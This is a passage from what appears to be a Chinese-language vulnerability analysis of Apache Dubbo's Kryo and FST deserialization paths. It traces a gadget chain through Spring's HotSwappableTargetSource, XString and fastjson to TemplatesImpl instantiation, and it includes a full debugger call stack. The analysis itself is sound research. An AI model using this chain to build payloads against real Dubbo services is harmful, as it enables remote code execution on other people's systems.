进入到com.esotericsoftware.kryo.Kryo#readClassAndObject方法

后续的利用链HashMap.put()–>HashMap.putVal()–>org.springframework.aop.target.HotSwappableTargetSource#equals -> com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)->JSONObject.toString()

调用链

newInstance:396, Class (java.lang)getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)write:270, MapSerializer (com.alibaba.fastjson.serializer)write:44, MapSerializer (com.alibaba.fastjson.serializer)write:280, JSONSerializer (com.alibaba.fastjson.serializer)toJSONString:863, JSON (com.alibaba.fastjson)toString:857, JSON (com.alibaba.fastjson)equals:392, XString (com.sun.org.apache.xpath.internal.objects)equals:104, HotSwappableTargetSource (org.springframework.aop.target)putVal:634, HashMap (java.util)put:611, HashMap (java.util)read:162, MapSerializer (com.esotericsoftware.kryo.serializers)read:39, MapSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:813, Kryo (com.esotericsoftware.kryo)readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)decodeRemovalReentryProtection:489, ByteToMessageDecoder (io.netty.handler.codec)callDecode:428, ByteToMessageDecoder (io.netty.handler.codec)channelRead:265, ByteToMessageDecoder (io.netty.handler.codec)invokeChannelRead:362, AbstractChannelHandlerContext (io.netty.channel)invokeChannelRead:348, AbstractChannelHandlerContext (io.netty.channel)fireChannelRead:340, AbstractChannelHandlerContext (io.netty.channel)channelRead:1434, DefaultChannelPipeline$HeadContext (io.netty.channel)invokeChannelRead:362, AbstractChannelHandlerContext (io.netty.channel)invokeChannelRead:348, AbstractChannelHandlerContext (io.netty.channel)fireChannelRead:965, DefaultChannelPipeline (io.netty.channel)read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)processSelectedKey:647, NioEventLoop (io.netty.channel.nio)processSelectedKeysOptimized:582, NioEventLoop (io.netty.channel.nio)processSelectedKeys:499, NioEventLoop (io.netty.channel.nio)run:461, NioEventLoop (io.netty.channel.nio)run:884, SingleThreadEventExecutor$5 (io.netty.util.concurrent)run:30, FastThreadLocalRunnable (io.netty.util.concurrent)run:745, Thread (java.lang)

FST反序列化

和Kryo反序列化一样，首先根据this.serializationType获取序列化器

获取到KryoSerialization序列化器后调用deserialize()创建一个FstObjectInput对象

接着继续获取客户端传来的版本，服务名，方法名，方法描述符等信息，在创建对象数组和类数组，在从输入流中根据类数组类型恢复对象数组

进入in.readObject()方法

再来到org.nustaq.serialization.FSTObjectInput#readObject(java.lang.Class…)方法

接下来的处理过程全为fst依赖包处理的，后续的利用链还是HashMap.put()–>HashMap.putVal()–>org.springframework.aop.target.HotSwappableTargetSource#equals -> com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)->JSONObject.toString()
